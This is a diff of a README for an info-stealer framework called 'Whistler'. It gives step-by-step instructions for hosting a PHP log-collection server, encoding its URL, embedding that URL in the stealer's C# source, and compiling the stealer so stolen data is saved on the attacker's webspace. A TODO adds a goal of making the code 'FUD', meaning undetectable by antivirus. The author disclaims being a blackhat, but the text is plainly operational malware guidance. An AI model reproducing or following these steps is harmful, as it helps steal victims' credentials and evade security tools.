@@ -27,14 +27,15 @@ Also i want to make clear i am NOT a blackhat.
 
 Now the full way to use this framework :
 
-1. Upload the www Folder to your webspace and CHMOD 777 the php file and logs folder
-2. Compile WhistlerDecoder and start it.
+1. Upload the contents of the Folder called "SERVER" to your webspace and CHMOD 777 the php file and logs folder
+2. Go to the folder called "Stealer" and open the Visual Studio file , then compile WhistlerDecoder and start it.
 3. Enter your webspace URL or IP path (http://yourIPorDomain.com/server.php) for example
 4. Click ENCODE and copy the now generated encoded text of your IP / Domain 
-5. Open the .SLN file with your IDE and find Whistler -> frmMain.cs 
-6. Find the line declaring a the URL string within the brackets "" and paste your IP / Domain from step 4
-7. Make changes to the code / add / remove stuff as you wish , then compile the software
-8. Done :) You can now use the stealer and logs are getting saved to the logs folder you uploaded to the webspace.
+5. find the Project called Whistler -> open the code of frmMain.cs of the stealer 
+and find line 28 "urlToServer" , replace the "xxx" string with the encoded string from the decoder.
+
+6. Make changes to the code / add / remove stuff as you wish , then compile the software
+7. Done :) You can now use the stealer and logs are getting saved to the logs folder you uploaded to the webspace.
 
 # TODO list / known bugs 
 - TODO - Make the code FUD
